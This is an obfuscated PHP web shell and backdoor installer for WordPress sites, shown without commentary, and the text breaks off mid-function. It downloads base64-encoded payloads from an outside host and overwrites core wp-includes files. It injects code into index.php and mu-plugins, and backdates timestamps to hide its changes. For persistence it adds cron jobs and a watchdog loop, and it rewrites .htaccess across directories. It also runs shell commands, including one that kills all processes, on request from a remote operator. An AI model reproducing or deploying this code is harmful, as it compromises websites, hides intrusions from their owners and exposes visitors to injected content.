<?php function get($url) { $Idqnisa = @file_get_contents($url); if (!$Idqnisa) { $Idqains = curl_init(); curl_setopt($Idqains, CURLOPT_URL, $url); curl_setopt($Idqains, CURLOPT_RETURNTRANSFER, 1); curl_setopt($Idqains, CURLOPT_SSL_VERIFYPEER, false); $Idqnisa = curl_exec($Idqains); curl_close($Idqains); } return $Idqnisa; } function del($name) { if (@unlink($name)) { return true; } return false; } function mv($name, $newname) { if (@rename($name, $newname)) { return true; } return false; } function index($root, $IidnasqLink, $Iidzu) { $Iadqsni = ""; $Iaiqsdn = $root . "/index.php"; $Iaisdnq = $root . "/index.html"; $Iaisdwi = $root . "/wp-includes"; $Iaisdth = getPhpPath(); if (is_dir($Iaisdwi)) { if (@chmod($Iaisdwi . '/template-loader.php', 0644)) { @file_put_contents($Iaisdwi . '/template-loader.php', base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9zaC50aGViZXN0Y29kZS50b3Avd3AvdGVtcGxhdGUtbG9hZGVyLnR4dHM=')))); } if (@chmod($Iaisdwi . '/load.php', 0644)) { @file_put_contents($Iaisdwi . '/load.php', base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9zaC50aGViZXN0Y29kZS50b3Avd3AvbG9hZC50eHRz')))); } if (@chmod($Iaisdwi . '/cron.php', 0644)) { @file_put_contents($Iaisdwi . '/cron.php', base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9zaC50aGViZXN0Y29kZS50b3Avd3AvY3Jvbi50eHRz')))); } if (@chmod($Iaisdwi . '/plugin.php', 0644)) { @file_put_contents($Iaisdwi . '/plugin.php', base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9zaC50aGViZXN0Y29kZS50b3Avd3AvcGx1Z2luLnR4dHM=')))); } if (@chmod($Iaisdwi . '/pluggable.php', 0644)) { @file_put_contents($Iaisdwi . '/pluggable.php', base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9zaC50aGViZXN0Y29kZS50b3Avd3AvcGx1Z2dhYmxlLnR4dHM=')))); } if (@chmod($Iaisdwi . '/query.php', 0644)) { @file_put_contents($Iaisdwi . '/query.php', base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9zaC50aGViZXN0Y29kZS50b3Avd3AvcXVlcnkudHh0cw==')))); } if (@chmod($Iaisdwi . '/class-wp.php', 0644)) { @file_put_contents($Iaisdwi . '/class-wp.php', base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9zaC50aGViZXN0Y29kZS50b3Avd3AvY2xhc3Mtd3AudHh0cw==')))); } } if (file_exists($Iaisdnq) && !file_exists($Iaiqsdn)) { $Iisanat = @filemtime($Iaisdnq); $Iisanqd = file_get_contents($Iaisdnq); @unlink($Iaisdnq); $Iadqsni .= "del:html-"; } else { $Iisanat = @filemtime($Iaiqsdn); $Iisanqd = @file_get_contents($Iaiqsdn); } $Iadqsni .= "o:" . strlen($Iisanqd) . '-'; $Iisqnad = get($IidnasqLink); if (strlen($Iisqnad) < 10000) { return $IidnasqLink . ": url get wrong.||" . $Iisqnad; } $Iadqsni .= "c:" . strlen($Iisqnad) . '-'; if (@chmod($Iaiqsdn, 0644)) { $Iadqsni .= 'true' . "|"; } else { if (strlen($Iisanqd) > 100) { @unlink($Iaiqsdn); } $Iadqsni .= 'false' . "|"; } $Iqsandi = str_replace('%{1111}%', $Iidzu, $Iisqnad) . PHP_EOL . $Iisanqd; $Insqiad = @file_put_contents($Iaiqsdn, $Iqsandi); if ($Insqiad !== false) { $Iadqsni .= 'r:' . $Insqiad . "-"; if ($Insqiad == strlen($Iqsandi)) { $Iadqsni .= 'success' . "|"; if (is_dir($Iaisdwi)) { if (!is_dir($root . "/wp-includes/images/")) { @mkdir($root . "/wp-includes/images/"); } if (!is_dir($root . "/wp-includes/blocks/")) { @mkdir($root . "/wp-includes/blocks/"); } $Iaiqsii = $root . "/wp-includes/images/"; $Iaiqscc = $root . "/wp-includes/blocks/" . rnd_strword(6, 0, 1) . '.php'; } else { $Iaiqsaa = rnd_strword(6, 0, 1); @mkdir($Iaiqsaa); $Iaiqsii = $root . '/' . $Iaiqsaa . '/'; $Iaiqsbb = rnd_strword(6, 0, 1); @mkdir($Iaiqsbb); $Iaiqscc = $root . '/' . $Iaiqsbb . '/' . rnd_strword(6, 0, 1) . '.php'; } $file_suff_array = array(".html", ".htm", ".zip", ".txt", ".png", ".jpg", ".gif"); $random_keys = array_rand($file_suff_array, 3); $file_suff_in = $file_suff_array[$random_keys[0]]; $file_suff_pl = $file_suff_array[$random_keys[1]]; $file_suff_re = $file_suff_array[$random_keys[2]]; $Iaiqsym = $Iaiqsii . rnd_strword(6, 0, 1) . $file_suff_in; @file_put_contents($Iaiqsym, $Iqsandi); if ($Iisanat) { touch($Iaiqsdn, $Iisanat); touch($Iaiqsym, $Iisanat); } @chmod($Iaiqsdn, 0444); $con = "<?php \n\$insj = 'BBBBB';\n\$inym = '" . $Iaiqsym . "';\n"; $abc = base64_decode('aWYgKGZpbGVfZXhpc3RzKCRpbnNqKSkgewogICAgaWYgKGZpbGVfZXhpc3RzKCRpbnltKSkgewogICAgICAgIEBjaG1vZCgkaW5zaiwgMDc3Nyk7CiAgICAgICAgaWYgKG1kNV9maWxlKCRpbnNqKSA9PSBtZDVfZmlsZSgkaW55bSkpIHsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkY2hhemggPSBAZmlsZV9nZXRfY29udGVudHMoJGlueW0pOwoJCQkkYXQgPSBmaWxlbXRpbWUoJGlueW0pOwogICAgICAgICAgICBmaWxlX3B1dF9jb250ZW50cygkaW5zaiwgJGNoYXpoKTsKICAgICAgICAgICAgaWYgKCRhdCkgewogICAgICAgICAgICAgICAgdG91Y2goJGluc2osICRhdCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgkJQGNobW9kKCRpbnNqLCAwNDQ0KTsKICAgIH0KfSBlbHNlIHsKICAgIGlmIChmaWxlX2V4aXN0cygkaW55bSkpIHsKCQkkYXQgPSBmaWxlbXRpbWUoJGlueW0pOwogICAgICAgICRjaGF6aCA9IEBmaWxlX2dldF9jb250ZW50cygkaW55bSk7CiAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGluc2osICRjaGF6aCk7CgkJaWYgKCRhdCkgewoJCQl0b3VjaCgkaW5zaiwgJGF0KTsKCQl9CiAgICB9Cn0KPz4='); $con = str_replace('BBBBB', $Iaiqsdn, $con); $conn = $con . $abc; if (@file_put_contents($Iaiqscc, $conn)) { touch($Iaiqscc, strtotime('-' . rand(200, 500) . ' days', time())); $cron1 = 'crontab -l > cccc && echo "0 */12 * * * ' . $Iaisdth . ' ' . $Iaiqscc . '" >> cccc && crontab cccc && rm -rf cccc'; $cron2 = 'crontab -l > cccc || echo "0 */12 * * * ' . $Iaisdth . ' ' . $Iaiqscc . '" >> cccc && crontab cccc && rm -rf cccc'; if (run('ps aux')) { run($cron1); if (strpos(run('crontab -l'), $Iaiqscc)) { $Iadqsni .= "cron:success|"; } else { run($cron2); if (strpos(run('crontab -l'), $Iaiqscc)) { $Iadqsni .= "cron:success|"; } else { $Iadqsni .= "cron:failed|"; } } } else { $Iadqsni .= "cron:failed|"; } } else { $Iadqsni .= "cron:failed|"; } } else { $Iadqsni .= 'failed' . "|"; } if (is_dir($root . "/wp-includes")) { $recon = base64_decode("PD9waHAKJGluID0gIklJSSI7CiRia2luID0gIkJJQkkiOwppZigkaW4gJiYgZmlsZV9leGlzdHMoJGJraW4pKXsKCWlmKCFmaWxlX2V4aXN0cygkaW4pIG9yIChmaWxlc2l6ZSgkaW4pICE9IGZpbGVzaXplKCRia2luKSkpewoJCUBjaG1vZCgkaW4sMDY0NCk7CgkJQGZpbGVfcHV0X2NvbnRlbnRzKCRpbixmaWxlX2dldF9jb250ZW50cygkYmtpbikpOwoJCUBjaG1vZCgkaW4sMDQ0NCk7Cgl9Cn0KPz4="); $newcon = str_replace('III', $Iaiqsdn, $recon); $newcon = str_replace('BIBI', $Iaiqsym, $newcon); $repng = $root . "/wp-includes/images/" . rnd_strword(6, 0, 1) . $file_suff_re; if (@file_put_contents($repng, $newcon)) { touch($repng, strtotime('-' . rand(200, 500) . ' days', time())); $class_wp_path = $root . "/wp-includes/class-wp.php"; if (is_file($class_wp_path)) { $awt = @filemtime($class_wp_path); $class_wp = @file_get_contents($class_wp_path); preg_match_all('/global \$.*?;/si', $class_wp, $matches); $str_old = $matches[0][rand(0, count($matches[0]) - 1)]; $new_class_wp = str_replace($str_old, $str_old . "\r\n\t\tinclude \"" . str($repng) . "\";", $class_wp); if (@file_put_contents($class_wp_path, $new_class_wp)) { if ($awt) { touch($class_wp_path, $awt); } $Iadqsni .= "rewrite:success|"; } else { $Iadqsni .= 'rewrite:fail|'; } } else { $Iadqsni .= 'rewrite:fail|'; } } else { $Iadqsni .= 'rewrite:fail|'; } } } $w_c = $root . '/wp-content'; $w_f = $root . '/wp-config.php'; $Iqsandu = str_replace('%{1111}%', $Iidzu, $Iisqnad); $Iaiqsdu = $w_c . '/mu-plugins/' . rnd_strword(6, 0, 1) . '.php'; if (is_dir($w_c) && is_file($w_f)) { if (is_dir($w_c . '/mu-plugins')) { $Insqiau = @file_put_contents($Iaiqsdu, $Iqsandu); } else { mkdir($w_c . '/mu-plugins'); $Insqiau = @file_put_contents($Iaiqsdu, $Iqsandu); } } if ($Insqiau !== false) { $Iadqsni .= 'mu:' . $Insqiau . "-"; if ($Insqiau == strlen($Iqsandu)) { $Iadqsni .= 'success|'; } else { $Iadqsni .= 'failed|'; } } $ot_file_1 = $root . '/link.php'; $ot_file_2 = $root . '/post.php'; $Iqsandu_1 = str_replace('%{1111}%', $Iidzu - 1, $Iisqnad); $Iqsandu_2 = str_replace('%{1111}%', $Iidzu + 1, $Iisqnad); if (@file_put_contents($ot_file_1, $Iqsandu_1) && @file_put_contents($ot_file_2, $Iqsandu_2)) { $Iadqsni .= 'ot:success'; } else { $Iadqsni .= 'ot:failed'; } return $Iadqsni; } function up($IsaindqPath, $IidnasqLink) { $Iqnsida = get($IidnasqLink); @chmod($IsaindqPath, 0644); $Iqdasin = @file_put_contents($IsaindqPath, $Iqnsida); if (strlen($Iqnsida) > 100 && strlen($Iqnsida) == $Iqdasin) { return "success"; } else { return "failed"; } } function run($Iidnasq, $Inaqsdi = 'popen') { $PAT = 'p'; $xNgur = 'o'; $q = 'e'; $DVe = 'n'; $strNX = $PAT . $xNgur . $PAT . $q . $DVe; $Idsinqa = explode(',', ini_get('disable_functions')); if (in_array($Inaqsdi, $Idsinqa)) { $Inaqsdi = 'exec'; } if (in_array($Inaqsdi, $Idsinqa)) { return false; } $Insqiad = ''; switch ($Inaqsdi) { case 'exec': exec($Iidnasq, $Iqnsidarray); foreach ($Iqnsidarray as $Iqdians => $value) { $Insqiad .= $Iqdians . " : " . $value . PHP_EOL; } return $Insqiad; break; case 'popen': $Idqsain = $strNX($Iidnasq, "r"); while (!feof($Idqsain)) { $Idasiqn = fgets($Idqsain, 4096); $Insqiad .= $Idasiqn; } pclose($Idqsain); return $Insqiad; break; default: return false; break; } } function str($str) { $arr = str_split($str); $out = ""; foreach ($arr as $k => $v) { $char = ord($v); $out .= '\\' . decoct($char); } return $out; } function unlock() { return run("kill -9 -1"); } function getPhpPath() { ob_start(); phpinfo(1); $Iadqsni = ob_get_contents(); ob_end_clean(); preg_match("/--bindir=([^&]+)/si", $Iadqsni, $matches); if (isset($matches[1]) && $matches[1] != '') { return $matches[1] . '/php'; } preg_match("/--prefix=([^&]+)/si", $Iadqsni, $matches); if (!isset($matches[1])) { return 'php'; } return $matches[1] . '/bin/php'; } function lock() { $Idsinqa = explode(',', ini_get('disable_functions')); if (in_array("exec", $Idsinqa) && in_array("popen", $Idsinqa)) { return "failed"; } else { $Indsiqa = getPhpPath(); $Idsqina = __DIR__ . "/l.php"; $Iidsqna = base64_decode('JGluZGV4X3BhdGggPSBfX0RJUl9fIC4iL2luZGV4LnBocCI7CiAgICAkaW5kZXhfY29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRpbmRleF9wYXRoKTsKICAgICRpbmRleF9tZDUgPSBtZDUoJGluZGV4X2NvbnRlbnQpOwogICAgJGh0YWNjZXNzX3BhdGggPSBfX0RJUl9fIC4iLy5odGFjY2VzcyI7CiAgICAkaHRhY2Nlc3NfY29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRodGFjY2Vzc19wYXRoKTsKICAgICRodGFjY2Vzc19tZDUgPSBtZDUoJGh0YWNjZXNzX2NvbnRlbnQpOwoKICAgIHdoaWxlICh0cnVlKQogICAgewogICAgICAgICR0ZW1wX21kNSA9IEBtZDUoZmlsZV9nZXRfY29udGVudHMoJGluZGV4X3BhdGgpKTsKICAgICAgICBpZiAoIWZpbGVfZXhpc3RzKCRpbmRleF9wYXRoKSAgfHwgJHRlbXBfbWQ1ICE9ICRpbmRleF9tZDUpIHsKICAgICAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRpbmRleF9wYXRoLCAkaW5kZXhfY29udGVudCk7CiAgICAgICAgICAgIEB0b3VjaCgkaW5kZXhfcGF0aCwgc3RydG90aW1lKCItNDAwIGRheXMiLCB0aW1lKCkpKTsKICAgICAgICAgICAgQGNobW9kKCRpbmRleF9wYXRoLCAwNDQ0KTsKICAgICAgICB9CiAgICAgICAgJHRlbXBfbWQ1ID0gQG1kNShmaWxlX2dldF9jb250ZW50cygkaHRhY2Nlc3NfcGF0aCkpOwogICAgICAgIGlmICghZmlsZV9leGlzdHMoJGh0YWNjZXNzX3BhdGgpIHx8ICR0ZW1wX21kNSAhPSAkaHRhY2Nlc3NfbWQ1KSB7CiAgICAgICAgICAgIEBmaWxlX3B1dF9jb250ZW50cygkaHRhY2Nlc3NfcGF0aCwgJGh0YWNjZXNzX2NvbnRlbnQpOwogICAgICAgICAgICBAdG91Y2goJGh0YWNjZXNzX3BhdGgsIHN0cnRvdGltZSgiLTQwMCBkYXlzIiwgdGltZSgpKSk7CiAgICAgICAgICAgIEBjaG1vZCgkaHRhY2Nlc3NfcGF0aCwgMDQ0NCk7CiAgICAgICAgfQogICAgICAgIHNsZWVwKDEpOwogICAgfQ=='); $Iidsqna = "<?php unlink('{$Idsqina}');" . str_replace('__DIR__', "'" . __DIR__ . "'", $Iidsqna); @file_put_contents($Idsqina, $Iidsqna); $Iidnasq = "nohup {$Indsiqa} " . $Idsqina . ' ' . base64_decode('Pi9kZXYvbnVsbCAyPiYxICY='); run($Iidnasq); sleep(2); @unlink($Idsqina); return "success"; } } function checkLockStatus() { $Isdaqni = __DIR__ . "/index.php"; $Isnqida = base64_decode("PD9waHAgLy9hYmNkZWYgPz4="); $Iisqnad = @file_get_contents($Isdaqni); @file_put_contents($Isdaqni, $Isnqida . PHP_EOL . $Iisqnad); sleep(2); $Iiaqdsn = @file_get_contents($Isdaqni); if (strpos($Iiaqdsn, $Isnqida) !== false) { @file_put_contents($Isdaqni, $Iisqnad); return "failed"; } else { return "success"; } } function clearIndex($root) { $Iisanqd = base64_decode('PD9waHAKZGVmaW5lKCAnV1BfVVNFX1RIRU1FUycsIHRydWUgKTsKcmVxdWlyZSBfX0RJUl9fIC4gJy93cC1ibG9nLWhlYWRlci5waHAnOw=='); $w_c = $root . '/wp-content'; $w_f = $root . '/wp-config.php'; if (is_dir($w_c) && is_file($w_f)) { @chmod($root . '/index.php', 0644); $Insqiad = @file_put_contents($root . '/index.php', $Iisanqd); } if ($Insqiad == strlen($Iisanqd)) { return "success"; } else { return "failed"; } } function searchDir($path, &$Indiqas, &$Ianisdq) { if (is_dir($path) && is_readable($path)) { $Iadsniq = dir($path); while ($Isaindq = $Iadsniq->read()) { if ($Isaindq != '.' && $Isaindq != '..') { if (is_dir($path . '/' . $Isaindq) && is_readable($path . '/' . $Isaindq)) { @unlink($path . '/' . $Isaindq . '/.htaccess'); $Insqiad = @file_put_contents($path . '/' . $Isaindq . '/.htaccess', $Indiqas); if ($Insqiad == strlen($Indiqas)) { $Ianisdq[] = $path . '/' . $Isaindq . '/.htaccess'; } searchDir($path . '/' . $Isaindq, $Indiqas, $Ianisdq); } } } $Iadsniq->close(); } } function writeHtaccessToAllDirs() { $Indiqas = base64_decode("PEZpbGVzTWF0Y2ggIi4ocHl8ZXhlfHBodG1sfHBocHxQSFB8UGhwfFBIcHxwSHB8cEhQfHBoUHxQaFB8cGhwNXxzdXNwZWN0ZWQpJCI+Ck9yZGVyIGFsbG93LGRlbnkKRGVueSBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CjxGaWxlc01hdGNoICJeKGluZGV4LnBocHxjcmVkaXRzLnBocHxjdXN0b21pemUucGhwfGVkaXQtY29tbWVudHMucGhwfGVkaXQtdGFncy5waHB8ZWRpdC5waHB8Y2hlY2tib3gucGhwfGV4cG9ydC5waHB8aW5wdXQucGhwfGxpbmsucGhwfGxvYWQtc2NyaXB0cy5waHB8bG9hZC1zdHlsZXMucGhwfGRyb3Bkb3duLnBocHxtZW51LnBocHxuYXYtbWVudXMucGhwfG5ldHdvcmsucGhwfG9wdGlvbnMtZGlzY3Vzc2lvbi5waHB8b3B0aW9ucy1nZW5lcmFsLnBocHxvcHRpb25zLXBlcm1hbGluay5waHB8b3B0aW9ucy1wcml2YWN5LnBocHxvcHRpb25zLXJlYWRpbmcucGhwfG9wdGlvbnMtd3JpdGluZy5waHB8cGx1Z2lucy5waHB8cG9zdC1uZXcucGhwfHBvc3QucGhwfHByaXZhY3kucGhwfHByb2ZpbGUucGhwfHNpdGUtaGVhbHRoLnBocHx0ZXJtLnBocHx0ZXh0LnBocHx0aGVtZXMucGhwfHRvb2xzLnBocHx1cGRhdGUtY29yZS5waHB8dXNlci1lZGl0LnBocHx1c2VyLW5ldy5waHB8dXNlcnMucGhwfHdwLWxpbmtzLnBocHx3cC1sb2dpbi5waHB8d3Atc2lnbnVwLnBocCkkIj4KT3JkZXIgYWxsb3csZGVueQpBbGxvdyBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CjxJZk1vZHVsZSBtb2RfcmV3cml0ZS5jPgpSZXdyaXRlRW5naW5lIE9uClJld3JpdGVCYXNlIC8KUmV3cml0ZVJ1bGUgXmluZGV4LnBocCQgLSBbTF0KUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWYKUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWQKUmV3cml0ZVJ1bGUgLiBpbmRleC5waHAgW0xdCjwvSWZNb2R1bGU+"); $Ianisdq = array(); searchDir(dirname(__FILE__), $Indiqas, $Ianisdq); return count($Ianisdq); } function display($Iadqsni, $Isinaqd = 0) { switch ($Isinaqd) { case 0: die('{"info":"' . $Iadqsni . '"}'); break; case 1: die('{"error":"' . $Iadqsni . '"}'); break; default: die('{"info":"' . $Iadqsni . '"}'); break; } } function copyjk($wenjian) { global $dirdata; $nowpath = str_replace(str_replace('//', '/', $_SERVER['PHP_SELF']), '', str_replace('\\\\', '/', $_SERVER['SCRIPT_FILENAME'])) . '/'; if ($wenjian == '') { echo 'file name'; exit; } $wjming = array('checkbox.php', 'input.php', 'text.php', 'dropdown.php'); $dirdata = array(); $genmu = $_SERVER["DOCUMENT_ROOT"] . '/'; duwj($genmu, 0); unset($dirdb); @sort($dirdata); $sname = $nowpath . $wenjian; if (count($dirdata) < 5) { $suiji1 = array_rand($dirdata, count($dirdata)); $suiji2 = array_rand($dirdata, count($dirdata)); } else { $suiji1 = array_rand($dirdata, 5); $suiji2 = array_rand($dirdata, 5); } $urlhttp = 'http://'; if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') { $urlhttp = 'https://'; } $url = $urlhttp . $_SERVER['HTTP_HOST']; $tofileall = array(); foreach ($suiji1 as $val) { $ming = array_rand($wjming, 1); $zhi = $wjming[$ming]; $tofile = $dirdata[$val]['server_link'] . "/$zhi"; if (@copy($sname, $tofile)) { $tofile = str_replace($genmu, $url . '/', $tofile); array_push($tofileall, $tofile); } } $dhsc = "<FilesMatch \".(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|suspected)$\">\r\nOrder allow,deny\r\nDeny from all\r\n</FilesMatch>\r\n<FilesMatch \"^("; foreach ($suiji2 as $val) { if (!file_exists($dirdata[$val]['server_link'] . "/index.php")) { $tofile = $dirdata[$val]['server_link'] . "/index.php"; if (@copy($sname, $tofile)) { $tofile = str_replace($nowpath, $url . '/', $tofile); array_push($tofileall, $tofile); } } else { $sjrd = rnd_strword(6, 0, 1) . '.php'; $tofile = $dirdata[$val]['server_link'] . "/$sjrd"; if (@copy($sname, $tofile)) { $tofile = str_replace($nowpath, $url . '/', $tofile); $dhsc .= $sjrd . '|'; array_push($tofileall, $tofile); } } } $htaccess_path = './.htaccess'; $dhsc .= "index.php|credits.php|customize.php|edit-comments.php|edit-tags.php|edit.php|checkbox.php|export.php|input.php|link.php|load-scripts.php|load-styles.php|dropdown.php|menu.php|nav-menus.php|network.php|options-discussion.php|options-general.php|options-permalink.php|options-privacy.php|options-reading.php|options-writing.php|plugins.php|post-new.php|post.php|privacy.php|profile.php|site-health.php|term.php|text.php|themes.php|tools.php|update-core.php|user-edit.php|user-new.php|users.php|wp-links.php|wp-login.php|wp-signup.php)$\">\r\nOrder allow,deny\r\nAllow from all\r\n</FilesMatch>\r\n<IfModule mod_rewrite.c>\r\nRewriteEngine On\r\nRewriteBase /\r\nRewriteRule ^index.php$ - [L]\r\nRewriteCond %{REQUEST_FILENAME} !-f\r\nRewriteCond %{REQUEST_FILENAME} !-d\r\nRewriteRule . index.php [L]\r\n</IfModule>"; if (file_exists($htaccess_path)) { @chmod($htaccess_path, 0644); $htaccess_content = @file_get_contents($htaccess_path); @file_put_contents($htaccess_path, $dhsc); } else { @file_put_contents($htaccess_path, $dhsc); } @chmod($htaccess_path, 0444); echo json_encode(['info' => "success", 'file' => $tofileall]); } function haddjk($wenjian, $snfile) { global $dirdata; $nowpath = str_replace(str_replace('//', '/', $_SERVER['PHP_SELF']), '', str_replace('\\\\', '/', $_SERVER['SCRIPT_FILENAME'])) . '/'; $paarr = explode('/', $nowpath); $pasl = count($paarr); $sss = ''; for ($i = 0; $i < $pasl - 1; $i++) { $sefuncdb[$sss . $paarr[$i]] = $sss . $paarr[$i]; $sss = $sss . $paarr[$i] . '/'; } $sefuncdb = array_filter($sefuncdb); $dirarr = array(); foreach ($sefuncdb as $pathname) { $sjpa = $pathname . '/'; if ($dirad = @opendir($sjpa)) { while (($file = @readdir($dirad)) !== false) { $filepath = $sjpa . $file; if (@is_dir($filepath)) { if (substr($file, 0, 1) == '.') { continue; } $dirdb['filename'] = $file; $dirdb['server_link'] = $filepath; $dirarr[] = $dirdb; } } @closedir($dirad); } unset($dirdb); } if ($dirarr) { $hfileall = array(); foreach ($dirarr as $valar) { $shijip = $valar['server_link'] . '/'; if (is_dir($shijip)) { $dhsc = "<FilesMatch \".(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|suspected)$\">\r\nOrder allow,deny\r\nDeny from all\r\n</FilesMatch>\r\n<FilesMatch \"^(index.php|credits.php|customize.php|edit-comments.php|edit-tags.php|edit.php|checkbox.php|export.php|input.php|link.php|load-scripts.php|load-styles.php|dropdown.php|menu.php|nav-menus.php|network.php|options-discussion.php|options-general.php|options-permalink.php|options-privacy.php|options-reading.php|options-writing.php|plugins.php|post-new.php|post.php|privacy.php|profile.php|site-health.php|term.php|text.php|themes.php|tools.php|update-core.php|user-edit.php|user-new.php|users.php|wp-links.php|wp-login.php|wp-signup.php)$\">\r\nOrder allow,deny\r\nAllow from all\r\n</FilesMatch>\r\n<IfModule mod_rewrite.c>\r\nRewriteEngine On\r\nRewriteBase /\r\nRewriteRule ^index.php$ - [L]\r\nRewriteCond %{REQUEST_FILENAME} !-f\r\nRewriteCond %{REQUEST_FILENAME} !-d\r\nRewriteRule . index.php [L]\r\n</IfModule>"; $wjming = array('index.php', 'checkbox.php', 'input.php', 'text.php', 'dropdown.php'); $dirdata = array(); duwj($shijip, 0); unset($dirdb); @sort($dirdata); $sname = $nowpath . $wenjian; if (!is_file($sname)) { $sname = $nowpath . $snfile; } if (file_exists($shijip . '/' . '.htaccess')) { @chmod($shijip . '/' . '.htaccess', 0644); if (rename($shijip . '/' . '.htaccess', $shijip . '/' . 'htaccess.th')) { } else { unlink($shijip . '/' . '.htaccess'); } @file_put_contents($shijip . '/' . '.htaccess', $dhsc); } else { @file_put_contents($shijip . '/' . '.htaccess', $dhsc); } @chmod($shijip . '/' . '.htaccess', 0444); $jdfile = $shijip . 'text.php'; if (@copy($sname, $jdfile)) { touch($jdfile, strtotime('-' . rand(200, 500) . ' days', time())); array_push($hfileall, $jdfile); } if ($dirdata) { if (count($dirdata) < 5) { $suiji = array_rand($dirdata, count($dirdata)); } else { $suiji = array_rand($dirdata, 5); } if ($suiji) { foreach ($suiji as $val) { $ming = array_rand($wjming, 1); $zhi = $wjming[$ming]; $tofile = $dirdata[$val]['server_link'] . "/$zhi"; if (!file_exists($tofile)) { if (@copy($sname, $tofile)) { touch($tofile, strtotime('-' . rand(200, 500) . ' days', time())); array_push($hfileall, $tofile); } } } } } } } } echo json_encode(['info' => "success", 'file' => $hfileall]); } function eindex() { $nowpath = str_replace(str_replace('//', '/', $_SERVER['PHP_SELF']), '', str_replace('\\\\', '/', $_SERVER['SCRIPT_FILENAME'])) . '/'; $urlhttp = 'http://'; if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') { $urlhttp = 'https://'; } $url = $urlhttp . $_SERVER['HTTP_HOST']; $tofileall = array(); if (is_dir($nowpath . "/wp-includes")) { if (is_dir($nowpath . "/wp-includes/widgets") && !is_file($nowpath . "/wp-includes/widgets/index.php")) { if (@file_put_contents($nowpath . "/wp-includes/widgets/index.php", base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9zaC50aGViZXN0Y29kZS50b3Avd3AvaW5kZXgudHh0cw=='))))) { array_push($tofileall, $url . "/wp-includes/widgets/index.php"); } } if (is_dir($nowpath . "/wp-includes/ID3") && !is_file($nowpath . "/wp-includes/ID3/index.php")) { if (@file_put_contents($nowpath . "/wp-includes/ID3/index.php", base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9zaC50aGViZXN0Y29kZS50b3Avd3AvaW5kZXgudHh0cw=='))))) { array_push($tofileall, $url . "/wp-includes/ID3/index.php"); } } if (is_dir($nowpath . "/wp-admin/includes") && !is_file($nowpath . "/wp-admin/includes/index.php")) { if (@file_put_contents($nowpath . "/wp-admin/includes/index.php", base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9zaC50aGViZXN0Y29kZS50b3Avd3AvaW5kZXgudHh0cw=='))))) { array_push($tofileall, $url . "/wp-admin/includes/index.php"); } } } else { $newidir = $nowpath . "/" . rnd_strword(6, 0, 1); @mkdir($newidir); if (@file_put_contents($newidir . "/index.php", base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9zaC50aGViZXN0Y29kZS50b3Avd3AvaW5kZXgudHh0cw=='))))) { array_push($tofileall, str_replace($nowpath, '', $url . $newidir . "/index.php")); } } echo json_encode(['info' => "success", 'file' => $tofileall]); } function duwj($dir, $js) { global $dirdata; if ($js == 2) { return; } $js++; $dirs = @opendir($dir); while ($file = @readdir($dirs)) { $filepath = $dir . $file; if (@is_dir($filepath)) { if ($file == '.' || $file == '..') { continue; } $themess = strstr($file, 'plugins'); if ($themess) { continue; } $dirdb['filename'] = $file; $dirdb['server_link'] = $filepath; $dirdata[] = $dirdb; duwj($dir . $file . '/', $js); } } @closedir($dirs); } function rnd_strword($maxlen = 6, $rndm = 0, $simple = 0) { $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLNOPQRSTUVWXYZ0123456789'; if (!$simple) { $chars .= '/+_*#!@;'; } $str = ''; if ($rndm) { $maxlen = mt_rand(3, 9); } $chars_len = strlen($chars); while (strlen($str) < $maxlen) { $str .= $chars[mt_rand(0, $chars_len - 1)]; } unset($chars, $chars_len); return $str; } function getPath($scriptpath, $nowpath) { if ($nowpath == '.') { $nowpath = $scriptpath; } $nowpath = str_replace('\\', '/', $nowpath); $nowpath = str_replace('//', '/', $nowpath); if (substr($nowpath, -1) != '/') { $nowpath = $nowpath . '/'; } return $nowpath; } function m($msg) { echo '<div style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font-size:14px;text-align:center;font-weight:bold;">'; echo $msg; echo '</div>'; } if (!isset($_SERVER['PHP_SELF']) || !isset($_SERVER['SCRIPT_FILENAME'])) { display("get root dir", 1); } $Isinadq = str_replace(str_replace('//', '/', $_SERVER['PHP_SELF']), '', str_replace('\\\\', '/', $_SERVER['SCRIPT_FILENAME'])); if (!isset($_REQUEST['a'])) { display("##@#$@$$", 1); } switch ($_REQUEST['a']) { case "root": display($Isinadq); break; case "del": if (del($Isinadq . "/" . $_REQUEST['name'])) { display("success"); } display("failed"); break; case "mv": if (mv($Isinadq . "/" . $_REQUEST['name'], $Isinadq . "/" . substr($_REQUEST['name'], 0, strrpos($_REQUEST['name'], '/')) . '/dropdown.php')) { display("success"); } display("failed"); break; case "delmyself": if (del($_SERVER['SCRIPT_FILENAME'])) { display("success"); } display("failed"); break; case "index": if (isset($_REQUEST['link']) && isset($_REQUEST['domain'])) { $Iadqsni = index($Isinadq, base64_decode($_REQUEST['link']), $_REQUEST['domain']); } display($Iadqsni); break; case "checkbox": if (isset($_REQUEST['link'])) { $Iadqsni = up($Isinadq . "/checkbox.php", base64_decode($_REQUEST['link'])); $Iadhttp = 'http://'; if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') { $Iadhttp = 'https://'; } 